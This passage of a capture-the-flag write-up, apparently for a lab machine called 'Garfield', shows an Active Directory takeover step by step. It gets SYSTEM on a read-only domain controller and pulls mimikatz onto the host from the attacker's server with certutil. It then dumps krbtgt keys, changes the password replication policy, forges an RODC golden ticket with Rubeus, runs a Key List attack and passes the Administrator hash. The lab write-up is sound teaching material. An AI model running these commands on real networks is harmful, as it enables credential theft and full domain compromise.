S4U2Self
      │
      ▼
Administrator
      │
      ▼
S4U2Proxy
      │
      ▼
cifs/RODC01.garfield.htb
```

At this stage, possession of the ticket effectively grants authenticated access to the CIFS service on **RODC01** as **Administrator**.

### Authenticating with the Forged Ticket

The generated Kerberos ticket was loaded into the current session:

```shellscript
┌──(kuroshiro㉿a1sberg)-[~/HTB/GArfield]
└─$ export KRB5CCNAME=Administrator@cifs_RODC01.garfield.htb@GARFIELD.HTB.ccache
```

Authentication was then performed using Kerberos rather than a password:

```shellscript
┌──(kuroshiro㉿a1sberg)-[~/HTB/GArfield]
└─$ impacket-psexec -k -no-pass GARFIELD.HTB/Administrator@RODC01.garfield.htb                             
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Requesting shares on RODC01.garfield.htb.....
[*] Found writable share ADMIN$
[*] Uploading file kTVxhAnq.exe
[*] Opening SVCManager on RODC01.garfield.htb.....
[*] Creating service GxpK on RODC01.garfield.htb.....
[*] Starting service GxpK.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.8511]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system
```

### Assessment

This stage successfully converted delegated Active Directory permissions into full compromise of the Read-Only Domain Controller.

The attack chain now looks as follows:

```
j.arbuckle
      ▼
l.wilson
      ▼
l.wilson_adm
      ▼
RODC Administrators
      ▼
Control of RODC01$
      ▼
RBCD Configuration
      ▼
Administrator Impersonation
      ▼
RODC01
      ▼
NT AUTHORITY\SYSTEM
```

The most important takeaway is that **WriteAccountRestrictions** and delegated RODC administration rights ultimately provided a path to modify RODC-related configuration, establish Resource-Based Constrained Delegation, impersonate a privileged domain user, and obtain **SYSTEM** privileges on **RODC01**.

Obtaining **NT AUTHORITY\SYSTEM** on **RODC01** is a significant milestone, but the ultimate objective is not the **RODC01$** machine account itself. In a Read-Only Domain Controller environment, the more valuable asset is the dedicated **per-RODC krbtgt account** (**krbtgt\_8245**), which is responsible for signing Kerberos tickets for that specific RODC. By compromising the host, it becomes possible to access the cryptographic material associated with **krbtgt\_8245**, enabling the creation of forged Kerberos tickets trusted by the RODC. These forged tickets can then be leveraged in subsequent attacks, including Key List abuse against the writable domain controller, making compromise of **RODC01** a critical stepping stone toward full domain compromise rather than the final objective itself.

This represents a major turning point in the assessment, as control has now moved beyond Active Directory objects and into direct control of the Read-Only Domain Controller itself.

## Extracting the RODC Kerberos Signing Keys

After obtaining **NT AUTHORITY\SYSTEM** access on **RODC01**, the next objective was to retrieve the credentials associated with the RODC-specific **krbtgt\_8245** account. As discussed previously, this account is responsible for signing Kerberos tickets issued by the Read-Only Domain Controller and forms the foundation for subsequent ticket-forging attacks.

### Transferring Mimikatz to the Target

A temporary HTTP server was started on the attacker's machine to host the required binary:

```shellscript
┌──(kuroshiro㉿a1sberg)-[/usr/share/windows-resources/mimikatz/x64]
└─$ python3 -m http.server 1234
Serving HTTP on 0.0.0.0 port 1234 (http://0.0.0.0:1234/) ...
```

The binary was then downloaded directly onto **RODC01** using `certutil`:

```powershell
C:\Temp> certutil.exe -urlcache -split -f http://10.10.14.52:1234/mimikatz.exe C:\Temp\mimikatz.exe          
****  Online  ****
  000000  ...
  14ae00
CertUtil: -URLCache command completed successfully.
```

### Dumping the RODC krbtgt Account

With SYSTEM privileges already established, Mimikatz was executed to extract the credentials associated with **krbtgt\_8245**:

```powershell
C:\Temp> mimikatz.exe "privilege::debug" "lsadump::lsa /inject /name:krbtgt_8245" "exit"
 
  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(commandline) # privilege::debug
Privilege '20' OK

mimikatz(commandline) # lsadump::lsa /inject /name:krbtgt_8245
Domain : GARFIELD / S-1-5-21-2502726253-3859040611-225969357

RID  : 00000643 (1603)
User : krbtgt_8245

 * Primary
    NTLM : 445aa4221e751da37a10241d962780e2
    LM   : 
  Hash NTLM: 445aa4221e751da37a10241d962780e2
    ntlm- 0: 445aa4221e751da37a10241d962780e2
    lm  - 0: 0ab3d34a182bb016fc4cfd26544a9f16

 * WDigest
    01  6d31d1f92ef6d85f5517944f98bf5753
    02  8c46bd5ddc680291e70800990dbc02e3
    03  9ffbc24f29b9bb3df3c32b76631ff874
    04  6d31d1f92ef6d85f5517944f98bf5753
    05  8c46bd5ddc680291e70800990dbc02e3
    06  8fc97c500bf9c7c4a0d34a497f9c5245
    07  6d31d1f92ef6d85f5517944f98bf5753
    08  c4bac61b7ecb407d358f836d2f4e19c6
    09  c4bac61b7ecb407d358f836d2f4e19c6
    10  d8938c80e1e0c80a2ec1d8b06f42cb31
    11  67f002aa49f4400fa970a53e294f4bee
    12  c4bac61b7ecb407d358f836d2f4e19c6
    13  56062e2db43bc0069deb86de87509ca6
    14  67f002aa49f4400fa970a53e294f4bee
    15  7250fcfc09d9cb93345c0c1393e19e52
    16  7250fcfc09d9cb93345c0c1393e19e52
    17  04b30cd8b5381d4b8458b0c996503a91
    18  b48bda9ef98982d5ee33766a74880e01
    19  bb365cf4f0bcdadf35b6a9b04c58257b
    20  85addbd6d603cca1b500f2da02b205d0
    21  b6186618611e202aae4141716e6603f5
    22  b6186618611e202aae4141716e6603f5
    23  f3f6c9408db132bf8e59413b7b40bb16
    24  0acf88cc5cb3b35888708ebefe658b6f
    25  0acf88cc5cb3b35888708ebefe658b6f
    26  08b8941632a5017e7178a3761dfaf7fb
    27  c1b2fd89d0dafb5f9e18147042bdc433
    28  712f0b6ed3b7eb7f6f135a1e298c4e09
    29  bf8d51270f7f657079bb9744446d70cb

 * Kerberos
    Default Salt : GARFIELD.HTBkrbtgt_8245
    Credentials
      des_cbc_md5       : d540fe6192b9ecfe

 * Kerberos-Newer-Keys
    Default Salt : GARFIELD.HTBkrbtgt_8245
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : d6c93cbe006372adb8403630f9e86594f52c8105a52f9b21fef62e9c7a75e240
      aes128_hmac       (4096) : 124c0fd09f5fa4efca8d9f1da91369e5
      des_cbc_md5       (4096) : d540fe6192b9ecfe

 * NTLM-Strong-NTOWF
    Random Value : f4b51c2c0d006172304e31dbc6e0de6b

mimikatz(commandline) # exit
Bye!
```

### Analysis

Among all recovered credential material, the most significant finding was the **AES256 Kerberos key** associated with the **krbtgt\_8245** account. Modern Active Directory environments primarily use AES encryption for Kerberos authentication, making this key the most reliable and valuable artifact for ticket forgery operations.&#x20;

The extracted key:

```
d6c93cbe006372adb8403630f9e86594f52c8105a52f9b21fef62e9c7a75e240
```

belongs to the dedicated RODC Kerberos signing account rather than the RODC machine account itself. Possession of this cryptographic material effectively provides the trust anchor used by the Read-Only Domain Controller to validate Kerberos tickets, making it a critical prerequisite for the final stage of the attack chain, where forged tickets can be generated and accepted as legitimate by the RODC infrastructure.

The successful extraction confirms that the attacker now possesses the Kerberos signing keys used by the Read-Only Domain Controller.

```
SYSTEM on RODC01
        │
        ▼
LSA Secrets Access
        │
        ▼
krbtgt_8245
        │
        ▼
Kerberos Signing Keys
```

This represents a critical milestone because these keys can be used to generate Kerberos tickets trusted by the RODC.

Unlike a standard machine-account compromise, access to the **per-RODC krbtgt** account enables direct interaction with the RODC's ticket-validation process and is required for the Key List attack chain that follows.

## Modifying the Password Replication Policy

Having obtained control over the RODC management layer, the next step was to adjust the Password Replication Policy (PRP) to permit caching of privileged credentials.

### Allowing Administrator Credential Replication

The **msDS-RevealOnDemandGroup** attribute on the **RODC01** computer object was modified:

```shellscript
┌──(kuroshiro㉿a1sberg)-[~/HTB/GArfield]
└─$ bloodyad --host DC01.garfield.htb -u 'l.wilson_adm' -p 'kuroshiro123' set object 'RODC01$' msDS-RevealOnDemandGroup -v 'CN=Allowed RODC Password Replication Group,CN=Users,DC=garfield,DC=htb' -v 'CN=Administrator,CN=Users,DC=garfield,DC=htb'
[+] RODC01$'s msDS-RevealOnDemandGroup has been updated
```

### Analysis

The **msDS-RevealOnDemandGroup** attribute controls which accounts are permitted to have their credentials cached by the Read-Only Domain Controller.

By explicitly allowing the **Administrator** account, the attacker is instructing the RODC that replication of this credential is permitted.

```
Administrator
        │
        ▼
Allowed for Replication
        │
        ▼
RODC Credential Cache
```

## Removing Credential Replication Restrictions

Next, restrictions preventing sensitive accounts from being cached were removed.

```shellscript
┌──(kuroshiro㉿a1sberg)-[~/HTB/GArfield]
└─$ bloodyad --host DC01.garfield.htb -u 'l.wilson_adm' -p 'kuroshiro123' set object 'RODC01$' msDS-NeverRevealGroup
[+] RODC01$'s msDS-NeverRevealGroup has been updated
```

### Analysis

The **msDS-NeverRevealGroup** attribute contains accounts whose credentials should never be replicated to an RODC.

Under normal circumstances, highly privileged accounts such as Domain Admins and Administrator are protected by this policy.

Removing or modifying this restriction weakens the Password Replication Policy and allows previously protected credentials to become eligible for caching.

```
Administrator
        │
        ▼
NeverRevealGroup
        │
        ├── Normal State → Replication Blocked
        │
        └── Modified State → Replication Allowed
```

### Why These Changes Matter?

The combination of these two modifications directly supports the attack path identified earlier:

```
Control of RODC01 Object
            │
            ▼
Modify Password Replication Policy
            │
            ▼
Allow Administrator Replication
            │
            ▼
Cache Privileged Credentials
            │
            ▼
Abuse RODC Kerberos Trust
            │
            ▼
Key List Attack
            │
            ▼
Writable Domain Controller
```

{% endhint %}

### Assessment

At this stage, two significant objectives have been achieved:

1. The **krbtgt\_8245** Kerberos signing keys have been extracted from the compromised RODC.
2. The Password Replication Policy has been modified to permit replication of privileged credentials, including the **Administrator** account.

These actions collectively prepare the environment for the final phase of the attack. Rather than targeting the **RODC01$** machine account itself, the focus is now on abusing the RODC's trust relationship and Kerberos infrastructure to obtain credentials and authentication material that can be leveraged against the writable domain controller, ultimately moving the attack chain closer to full domain compromise.

## Forging an RODC Golden Ticket and Performing a Key List Attack

With control of the **RODC-specific krbtgt account** and possession of its AES256 signing key, the final phase of the attack focused on abusing the trust relationship between the Read-Only Domain Controller and the writable Domain Controller.

Rather than targeting the **RODC01$** machine account directly, the objective was to leverage the extracted **krbtgt\_8245** key to forge Kerberos authentication material that would be accepted as valid by the domain.

### Generating a Forged RODC TGT

The first step was to upload **Rubeus** to the compromised host:

```powershell
*Evil-WinRM* PS C:\Temp> upload Rubeus.exe
                                        
Info: Uploading /home/kuroshiro/HTB/GArfield/Rubeus.exe to C:\Temp\Rubeus.exe
                                        
Data: 687444 bytes of 687444 bytes copied
                                        
Info: Upload successful!
```

Using the previously extracted AES256 key from **krbtgt\_8245**, a forged Ticket Granting Ticket (TGT) for the **Administrator** account was generated:

```powershell
*Evil-WinRM* PS C:\Temp> .\Rubeus.exe golden /rodcNumber:8245 /flags:forwardable,renewable,enc_pa_rep /nowrap /outfile:administrator.kirbi /aes256:d6c93cbe006372adb8403630f9e86594f52c8105a52f9b21fef62e9c7a75e240 /user:Administrator /id:500 /domain:garfield.htb /sid:S-1-5-21-2502726253-3859040611-225969357

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.3.3

[*] Action: Build TGT

[*] Building PAC

[*] Domain         : GARFIELD.HTB (GARFIELD)
[*] SID            : S-1-5-21-2502726253-3859040611-225969357
[*] UserId         : 500
[*] Groups         : 520,512,513,519,518
[*] ServiceKey     : D6C93CBE006372ADB8403630F9E86594F52C8105A52F9B21FEF62E9C7A75E240
[*] ServiceKeyType : KERB_CHECKSUM_HMAC_SHA1_96_AES256
[*] KDCKey         : D6C93CBE006372ADB8403630F9E86594F52C8105A52F9B21FEF62E9C7A75E240
[*] KDCKeyType     : KERB_CHECKSUM_HMAC_SHA1_96_AES256
[*] Service        : krbtgt
[*] Target         : garfield.htb

[*] Generating EncTicketPart
[*] Signing PAC
[*] Encrypting EncTicketPart
[*] Generating Ticket
[*] Generated KERB-CRED
[*] Forged a TGT for 'Administrator@garfield.htb'

[*] AuthTime       : 7/17/2026 9:23:39 AM
[*] StartTime      : 7/17/2026 9:23:39 AM
[*] EndTime        : 7/17/2026 7:23:39 PM
[*] RenewTill      : 7/24/2026 9:23:39 AM

[*] base64(ticket.kirbi):

      doIFkjCCBY6gAwIBBaEDAgEWooIEfzCCBHthggR3MIIEc6ADAgEFoQ4bDEdBUkZJRUxELkhUQqIhMB+gAwIBAqEYMBYbBmtyYnRndBsMZ2FyZmllbGQuaHRio4IENzCCBDOgAwIBEqEGAgQgNQAAooIEIgSCBB7oIwxM2bs5YYr79XSYUuM5nX6mFZCrEtU3MKbxAQPP2G1ht5m6ltfFyxn9pnR5b9xen1xmYbr6IGmTtSllw30M8sDVBeGebCuW0VIVWl7bzaTWlf1D7SXv+c8AHa5tKA2l3EsMfm1k91WAN3O4F2sFRLGrlyZ25rNiFkNSbY/89X+d+gdRwKJFHtCyV/LT5CPS7Jo1QvWsM3iTLzK31WAq845xrGIk43qM7REhIJrCjNPnFW5QQ6yrJz9zDzT/CiIZqiE/Rack8r+nhniZXaSUEgAE+JE92ZtDRlb3RBCDTN/XNjP8Qc0YZIjgv+ECojQgutYYawWYekHswx/AHcnwOD+6Iba6Dp/I1+JM2JKXdJ3EwYXOKe2VGLnSFLBoPgUN6Nqv4j2OXqUzmd9uWcs6QQoeIxVYqV9SaMzNxTuSex53AEzSOI61quW2wWQbD/9kAPVo0qvW6DnqPzseVFVeAv2OrasbSTtuUbFSLZFMbFRgu2mIUuFYkqBEW00X5OnK0ETP1gt94sr93rE0k72eXAF0xeJ8TopWIaE3umXQvCcFKbvK6OJ+NufZFWPYIRcfpGythc4b1OdfhN/R3M0CgppUDfGlSpZUeCvhNlYJsTA/qLCuzQLfBv9PjdRX3J1m3Y+dJ7yfhwgsQx+G4RsJRy+4VOEZSmw28LD6/IWMjYXx7wlhZCRoi3j66FuIVkQBfKy1b36lz5S8fxgo07ABkdGnrocxys4KEw3N9xp97+1Ps6NlA1r1AZehDv+9RBp98vKXj9teAyNwgYcy1Zd/ILdJnj6aThdZLwIDPmdX/DkYLhPSlHoOgYlhfL4lrEtxaU/EQyJ1OAafGbaTK9a42kNjH0voWSTtHiXUMND8KikfB3OSGF+2fmevi5zdc0Jmw8/aCPON1FYyjz8T7r9bpW2eUAxoSc7/9xY+fFZvZAsoa/0pqAVPDLGa78UmsdDU6P3B6OhF/xKSINRtUX9C/ICwml/+lJwuDcycKiZ7nV4T8aEDYJ8Sn5bgUsNY4xp5FakqKNI4M75YRImn1AKekyI7WhtDpFv+NwQpPNK2Y7mxSJ1Y7XMtpPmpebAJ/OZDPFumTzYxOcU9PsZDZIepJdgfPjUmuXwaTBbIj+ETbhEsgsPcdsGMxFPwyqEh80CmphLED03Yx6EwAxk4sulDV+7wKh1eUaw0KReFsucqp52WFvVNrtvVR0bo6Wh26CCl5vmHvhwTnFXo+q5ZmlhQs0dU2pgSRWFpXZT6MqdiQ89rle9ShkwShqQ/9OULcyR4x8OoTBRJj74XXAkBRw/KN2+Z6KYkdr29K0maEp11+MxLMtNEACM8wzKqafvopQZP6ykH3r+Td1185wi1nfQi62J3e7KDGF3rZuIWqmJYlOQvjmI+ET/povOla0YPo4H+MIH7oAMCAQCigfMEgfB9ge0wgeqggecwgeQwgeGgKzApoAMCARKhIgQg3T4FOLONyjKcbACrpOY6eemxcqLRSuusbdzgX7idb0qhDhsMR0FSRklFTEQuSFRCohowGKADAgEBoREwDxsNQWRtaW5pc3RyYXRvcqMHAwUAQIEAAKQRGA8yMDI2MDcxNzE2MjMzOVqlERgPMjAyNjA3MTcxNjIzMzlaphEYDzIwMjYwNzE4MDIyMzM5WqcRGA8yMDI2MDcyNDE2MjMzOVqoDhsMR0FSRklFTEQuSFRCqSEwH6ADAgECoRgwFhsGa3JidGd0GwxnYXJmaWVsZC5odGI=


[*] Ticket written to administrator_2026_07_17_16_23_39_Administrator_to_krbtgt@GARFIELD.HTB.kirbi
```

The output confirms that a valid-looking Kerberos TGT was created and signed using the cryptographic material associated with the RODC-specific **krbtgt\_8245** account.

### Why Rubeus Was Executed from DC01 Instead of RODC01?

An important detail is that **Rubeus was executed from the compromised DC01 session (l.wilson\_adm)** rather than from the SYSTEM shell on **RODC01**.

This is because the next stage of the attack targets the **writable domain controller's Kerberos service**, not the RODC itself.

The forged ticket must ultimately be presented to **DC01**, which is responsible for servicing Kerberos requests and maintaining the writable Active Directory database. Running the operation from a host that already has direct communication with **DC01** simplifies interaction with the KDC and avoids unnecessary pivoting through the RODC.

Conceptually, the attack flow becomes:

```
krbtgt_8245 AES Key
          │
          ▼
Forge RODC TGT
          │
          ▼
Present Ticket to DC01
          │
          ▼
Key List Attack
          │
          ▼
Recover Writable DC Secrets
```

The attack is therefore focused on abusing trust relationships within Active Directory rather than performing actions locally on the RODC host itself.
{% endhint %}

### Requesting a Key List TGS

With the forged TGT available, Rubeus was used to request a special Key List service ticket:

```powershell
*Evil-WinRM* PS C:\Temp> .\Rubeus.exe asktgs /keyList /service:krbtgt/garfield.htb /dc:DC01.garfield.htb /ticket:doIFkjCCBY6gAwIBBaEDAgEWooIEfzCCBHthggR3MIIEc6ADAgEFoQ4bDEdBUkZJRUxELkhUQqIhMB+gAwIBAqEYMBYbBmtyYnRndBsMZ2FyZmllbGQuaHRio4IENzCCBDOgAwIBEqEGAgQgNQAAooIEIgSCBB7oIwxM2bs5YYr79XSYUuM5nX6mFZCrEtU3MKbxAQPP2G1ht5m6ltfFyxn9pnR5b9xen1xmYbr6IGmTtSllw30M8sDVBeGebCuW0VIVWl7bzaTWlf1D7SXv+c8AHa5tKA2l3EsMfm1k91WAN3O4F2sFRLGrlyZ25rNiFkNSbY/89X+d+gdRwKJFHtCyV/LT5CPS7Jo1QvWsM3iTLzK31WAq845xrGIk43qM7REhIJrCjNPnFW5QQ6yrJz9zDzT/CiIZqiE/Rack8r+nhniZXaSUEgAE+JE92ZtDRlb3RBCDTN/XNjP8Qc0YZIjgv+ECojQgutYYawWYekHswx/AHcnwOD+6Iba6Dp/I1+JM2JKXdJ3EwYXOKe2VGLnSFLBoPgUN6Nqv4j2OXqUzmd9uWcs6QQoeIxVYqV9SaMzNxTuSex53AEzSOI61quW2wWQbD/9kAPVo0qvW6DnqPzseVFVeAv2OrasbSTtuUbFSLZFMbFRgu2mIUuFYkqBEW00X5OnK0ETP1gt94sr93rE0k72eXAF0xeJ8TopWIaE3umXQvCcFKbvK6OJ+NufZFWPYIRcfpGythc4b1OdfhN/R3M0CgppUDfGlSpZUeCvhNlYJsTA/qLCuzQLfBv9PjdRX3J1m3Y+dJ7yfhwgsQx+G4RsJRy+4VOEZSmw28LD6/IWMjYXx7wlhZCRoi3j66FuIVkQBfKy1b36lz5S8fxgo07ABkdGnrocxys4KEw3N9xp97+1Ps6NlA1r1AZehDv+9RBp98vKXj9teAyNwgYcy1Zd/ILdJnj6aThdZLwIDPmdX/DkYLhPSlHoOgYlhfL4lrEtxaU/EQyJ1OAafGbaTK9a42kNjH0voWSTtHiXUMND8KikfB3OSGF+2fmevi5zdc0Jmw8/aCPON1FYyjz8T7r9bpW2eUAxoSc7/9xY+fFZvZAsoa/0pqAVPDLGa78UmsdDU6P3B6OhF/xKSINRtUX9C/ICwml/+lJwuDcycKiZ7nV4T8aEDYJ8Sn5bgUsNY4xp5FakqKNI4M75YRImn1AKekyI7WhtDpFv+NwQpPNK2Y7mxSJ1Y7XMtpPmpebAJ/OZDPFumTzYxOcU9PsZDZIepJdgfPjUmuXwaTBbIj+ETbhEsgsPcdsGMxFPwyqEh80CmphLED03Yx6EwAxk4sulDV+7wKh1eUaw0KReFsucqp52WFvVNrtvVR0bo6Wh26CCl5vmHvhwTnFXo+q5ZmlhQs0dU2pgSRWFpXZT6MqdiQ89rle9ShkwShqQ/9OULcyR4x8OoTBRJj74XXAkBRw/KN2+Z6KYkdr29K0maEp11+MxLMtNEACM8wzKqafvopQZP6ykH3r+Td1185wi1nfQi62J3e7KDGF3rZuIWqmJYlOQvjmI+ET/povOla0YPo4H+MIH7oAMCAQCigfMEgfB9ge0wgeqggecwgeQwgeGgKzApoAMCARKhIgQg3T4FOLONyjKcbACrpOY6eemxcqLRSuusbdzgX7idb0qhDhsMR0FSRklFTEQuSFRCohowGKADAgEBoREwDxsNQWRtaW5pc3RyYXRvcqMHAwUAQIEAAKQRGA8yMDI2MDcxNzE2MjMzOVqlERgPMjAyNjA3MTcxNjIzMzlaphEYDzIwMjYwNzE4MDIyMzM5WqcRGA8yMDI2MDcyNDE2MjMzOVqoDhsMR0FSRklFTEQuSFRCqSEwH6ADAgECoRgwFhsGa3JidGd0GwxnYXJmaWVsZC5odGI= /nowrap

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.3.3

[*] Action: Ask TGS

[*] Requesting default etypes (RC4_HMAC, AES[128/256]_CTS_HMAC_SHA1) for the service ticket
[*] Building KeyList TGS-REQ request for: 'Administrator'
[*] Using domain controller: DC01.garfield.htb (fe80::5b2d:a7be:a153:e1ef%7)
[+] TGS request successful!
[*] base64(ticket.kirbi):

      doIFnjCCBZqgAwIBBaEDAgEWooIEsTCCBK1hggSpMIIEpaADAgEFoQ4bDEdBUkZJRUxELkhUQqIhMB+gAwIBAqEYMBYbBmtyYnRndBsMR0FSRklFTEQuSFRCo4IEaTCCBGWgAwIBEqEDAgECooIEVwSCBFNabBzo0KtzuZZqN9ftdHf8yUszwlAYD4vFHVyOihXC/KpdQr2yfMblPTWZqQEjVq2TEcugQV7vIu6wAXJfzLl+8T9iwomQ1vP9TFo2K9Z69h/egdigrQ64k+R/eJT2tXI/kW5Z52ghYRFpUM/1mWLIyECw0RNijdssWCsUJ0uY7i66mBSernlGPCVLXBGOSoWJJb/c0D+yKKFkF97Zig2o+sv82mfqEznUS2uwEG70WdF9I6Bb4mXStn0Wzg9rL8tDr161o6ACpkXHjKuvWKEXLb3JgbU64tQrlTbNRs4dLJiPG+fxbzczQxwxJZux220S8S4XI33nyHVqVdnieL646XLE6rzSwnmXaelD1BF+gNe4zwKZC/JJgVNBxTTFWbmZGMZyMERX40U+TltZMY3168u8lhrK6a6rV07Z6p8KJQMUjcC7mfZ+sh1RJbk965U+skGb3mKsgkxfVmHTDdgb0Kj7cxF7V1NtfZNx0tj+pV/p19F4/FMEyH5gxNgKSP3umGk8Cd2cdo4j8uu8C4T5bmac8BmM10yD+naovFPE9UJXIxFVVSj4K7NDH5Kmy6rJMoU8HO5QRJvfpYD+2EPcWo7TPoXUUIPEpRXRReZBA5zOaqKNssRz6dBccvVaPXIDXvRiAZ6/obTAtt7Ne9EPyQlK1wZDw6WnDJPDDOMPjwpEWNc6DpouSjkzmxM8JcRl4A2H5lUEaZkAY3X7gIUnOV1VZfd16Bu72c3rrebB8drTFHMNYdJ35OvpZhF7rOS4kVC5y41N9+X2Y75JcCFoWb2/7m7a4AlOc2IlNp/uTesR3ADfV2EcnVO/iNVdju+3wbVvuHWmRjzm0byzBTvnIa79uKGFm10aPv+NoArZ/yZntT4KxjLPyjB1CkT1hUWqS5jyBhxJiFD9CNNUDbh0ZZvbgZZNbG3XNqFPkOFwHuRMIF1m/DuOZTcE1/6UXUSEK13JMVYTMrkAfeQyZOR/Ut40aFWPa8WHphAIg6tG94Od1i9CNuOLYOSL2Bf8BmyDtSSub2UGE2Y1iLzk61oVIitH8bnuMsqDpwhEgsO3mFD1bTegAQFW4zJbtRkRFk1O+NOBMTcb2fPCl7PpTofMWkzfXkNbiMiTPkBYOVUQTC5iJMyAkM/gmIrmlJW7Xqjy4yrW9RdsMpv+jvB+YMbVLcTbmWkPqh0qDm3jmd+8x5qBU4fF1yaGOURl/CnQFSw2MNvW91MBqvGQM4mVPz+bC4gDb3ziXvRr3ZMDGvzVuSF9yNSODAwe9uWjVGtH7ZJ6hUpRRsRoPqcm7dKc9x3RyQDYOgP6guA4q1WVfYu7P7m/ayRTkwwwwRjSQAox8CHhCPy5yNMucoZSJ6/7CRojXrd2hT6tW9eO04JGgJHzod3KaKEP/IJAfMAX6wbM7wH4XaZt1VgpArlYvvasaLwP1PjEoEryM5RjrTut9vVT5QU/08ZAuA7NZ+aOQZiTzQLLL3ijgdgwgdWgAwIBAKKBzQSByn2BxzCBxKCBwTCBvjCBu6ArMCmgAwIBEqEiBCBodVcEJYXhDQj0NoyHaYVt3f18Rm3/qr//ZT2yYSknhqEOGwxHQVJGSUVMRC5IVEKiGjAYoAMCAQGhETAPGw1BZG1pbmlzdHJhdG9yowcDBQAAAQAApREYDzIwMjYwNzE3MTYyNTQzWqYRGA8yMDI2MDcxODAyMjMzOVqoDhsMR0FSRklFTEQuSFRCqSEwH6ADAgECoRgwFhsGa3JidGd0GwxHQVJGSUVMRC5IVEI=

  ServiceName              :  krbtgt/GARFIELD.HTB
  ServiceRealm             :  GARFIELD.HTB
  UserName                 :  Administrator (NT_PRINCIPAL)
  UserRealm                :  GARFIELD.HTB
  StartTime                :  7/17/2026 9:25:43 AM
  EndTime                  :  7/17/2026 7:23:39 PM
  RenewTill                :  1/1/0001 12:00:00 AM
  Flags                    :  name_canonicalize
  KeyType                  :  aes256_cts_hmac_sha1
  Base64(key)              :  aHVXBCWF4Q0I9DaMh2mFbd39fEZt/6q//2U9smEpJ4Y=
  Password Hash            :  EE238F6DEBC752010428F20875B092D5
```

### Analysis

The Key List request effectively leveraged the forged RODC ticket to convince the writable Domain Controller that the request originated from a trusted Read-Only Domain Controller.

Because RODCs are designed to replicate and validate selected credential information, the writable DC honored the request and returned authentication material that would normally be inaccessible to a standard user.

The resulting privilege escalation path can be summarized as:

```
Control of RODC01
          │
          ▼
Dump krbtgt_8245
          │
          ▼
Forge RODC Golden Ticket
          │
          ▼
Key List Request
          │
          ▼
Recover Administrator Hash
          │
          ▼
Domain Administrator Access
```

### Verifying Domain Compromise

The recovered Administrator NTLM hash was then used to authenticate against the writable Domain Controller:

```shellscript
┌──(kuroshiro㉿a1sberg)-[~/HTB/GArfield]
└─$ evil-winrm -i DC01.garfield.htb -u Administrator -H 'EE238F6DEBC752010428F20875B092D5'
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
garfield\administrator
```

### Assessment

This final stage completed the full attack chain. By abusing delegated RODC administration rights, extracting the **krbtgt\_8245** Kerberos signing key, forging an RODC Golden Ticket, and performing a Key List attack against the writable Domain Controller, it was possible to obtain credentials for the domain's built-in Administrator account and achieve full compromise of the Active Directory environment.

The complete privilege escalation path can be visualized as follows:

```
j.arbuckle
      ▼
l.wilson
      ▼
l.wilson_adm
      ▼
RODC Administrators
      ▼
Control of RODC01
      ▼
Extract krbtgt_8245
      ▼
Forge RODC Golden Ticket
      ▼
Key List Attack
      ▼
Administrator Hash
      ▼
DC01
      ▼
Domain Administrator
```

This demonstrates how seemingly limited delegated permissions over a Read-Only Domain Controller can ultimately be chained into full domain compromise when combined with Kerberos trust abuse and misconfigured RODC administration rights.

### Summary

This machine started with the low-privileged account **j.arbuckle**, where enumeration of SMB shares, BloodHound data, and writable Active Directory objects revealed an interesting attack path involving **l.wilson** and **l.wilson\_adm**. By abusing write access to the **scriptPath** attribute and the writable **SYSVOL scripts** directory, a malicious logon script was deployed and linked to **l.wilson**, resulting in code execution under that user's context. Further BloodHound analysis showed that **l.wilson** possessed **ForceChangePassword** rights over **l.wilson\_adm**, allowing a password reset and escalation into the administrative account. From there, additional ACL analysis revealed that **l.wilson\_adm**, as a member of **Tier 1**, could leverage **AddSelf** permissions to join **RODC Administrators**, ultimately gaining delegated control over the **RODC01** computer object.

With control over the RODC management layer established, the attack transitioned into an abuse of the Read-Only Domain Controller trust model. Using **RBCD (Resource-Based Constrained Delegation)** and a machine account created through **SeMachineAccountPrivilege**, execution was obtained as **SYSTEM** on **RODC01**. This access allowed extraction of the **krbtgt\_8245** credentials, including the AES256 key used by the RODC for Kerberos ticket signing. After modifying the RODC password replication policy to permit caching of privileged credentials, an **RODC Golden Ticket** was forged with **Rubeus** and leveraged in a **Key List attack** against the writable domain controller. The attack successfully retrieved the **Administrator** credential material, which was then used to authenticate to **DC01**, resulting in full domain compromise. The challenge demonstrates how seemingly limited delegated permissions over an RODC can be chained together into complete Active Directory takeover through a combination of ACL abuse, delegation abuse, Kerberos manipulation, and RODC-specific privilege escalation techniques.
